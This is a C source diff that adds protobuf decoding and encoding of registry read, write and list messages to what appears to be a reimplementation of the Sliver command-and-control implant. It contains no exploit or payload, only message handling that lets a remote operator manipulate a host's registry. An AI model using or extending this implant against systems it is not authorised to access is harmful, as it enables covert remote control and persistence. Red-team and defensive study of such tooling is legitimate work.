@@ -1,5 +1,6 @@
 /* src/proto/proto.c - minimal protobuf writer/reader and Sliver messages. */
 #include "sliver/fs.h"
+#include "sliver/registry.h"
 #include "sliver/proc.h"
 #include "sliver/proto.h"
 
@@ -1333,3 +1334,86 @@ int sliver_mount_encode(sliver_buf_t *out, const sliver_mount_t *mounts, int cou
 }
 
 
+
+/* --- Registry ----------------------------------------------------------- */
+/* RegistryReadReq/WriteReq/Create/Delete/SubKeyList/ListValues share the
+ * Hive=1, Path=2, Key=3, Hostname=4 layout; the list requests only carry
+ * Hive/Path/Hostname. */
+int sliver_reg_req_decode(const void *data, size_t len, sliver_reg_req_t *out) {
+  sliver_reader_t r;
+  uint32_t field, wire;
+  int rc;
+
+  if (out == NULL) {
+    return -1;
+  }
+  memset(out, 0, sizeof(*out));
+  sliver_reader_init(&r, data, len);
+  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
+    if (wire == 2 && field == 1) {
+      if (sliver_reader_string(&r, out->hive, sizeof(out->hive)) != 0) return -1;
+    } else if (wire == 2 && field == 2) {
+      if (sliver_reader_string(&r, out->path, sizeof(out->path)) != 0) return -1;
+    } else if (wire == 2 && field == 3) {
+      if (sliver_reader_string(&r, out->key, sizeof(out->key)) != 0) return -1;
+    } else if (wire == 2 && field == 4) {
+      if (sliver_reader_string(&r, out->hostname, sizeof(out->hostname)) != 0) return -1;
+    } else if (wire == 2 && field == 5) {
+      if (sliver_reader_string(&r, out->string_value, sizeof(out->string_value)) != 0) return -1;
+    } else if (wire == 2 && field == 6) {
+      const uint8_t *bytes;
+      size_t n;
+      if (sliver_reader_bytes(&r, &bytes, &n) != 0) return -1;
+      if (n > sizeof(out->byte_value)) return -1;
+      memcpy(out->byte_value, bytes, n);
+      out->byte_len = n;
+    } else if (wire == 0 && field == 7) {
+      uint64_t v;
+      if (sliver_reader_varint(&r, &v) != 0) return -1;
+      out->dword = (uint32_t)v;
+    } else if (wire == 0 && field == 8) {
+      uint64_t v;
+      if (sliver_reader_varint(&r, &v) != 0) return -1;
+      out->qword = v;
+    } else if (wire == 0 && field == 10) {
+      uint64_t v;
+      if (sliver_reader_varint(&r, &v) != 0) return -1;
+      out->type = (uint32_t)v;
+    } else if (sliver_reader_skip(&r, wire) != 0) {
+      return -1;
+    }
+  }
+  return rc == 1 ? 0 : -1;
+}
+
+/* RegistryRead{Value=1, Binary=2, Type=8, Response=9}. */
+int sliver_reg_read_encode(sliver_buf_t *out, const char *value, const uint8_t *binary,
+                           size_t binary_len, uint32_t type, const char *err) {
+  if (sliver_buf_put_string(out, 1, value != NULL ? value : "") != 0) {
+    return -1;
+  }
+  if (binary_len != 0 && sliver_buf_put_bytes(out, 2, binary, binary_len) != 0) {
+    return -1;
+  }
+  if (type != 0 && sliver_buf_put_uint32(out, 8, type) != 0) {
+    return -1;
+  }
+  return encode_response(out, err);
+}
+
+/* RegistrySubKeyList{Subkeys=1 repeated}; the values list use ValueNames=1. */
+int sliver_reg_names_encode(sliver_buf_t *out, char (*names)[256], int count, const char *err) {
+  for (int i = 0; i < count; ++i) {
+    if (sliver_buf_put_string(out, 1, names[i]) != 0) {
+      return -1;
+    }
+  }
+  return encode_response(out, err);
+}
+
+
+
+
+int sliver_empty_response_encode(sliver_buf_t *out, const char *err) {
+  return encode_response(out, err);
+}
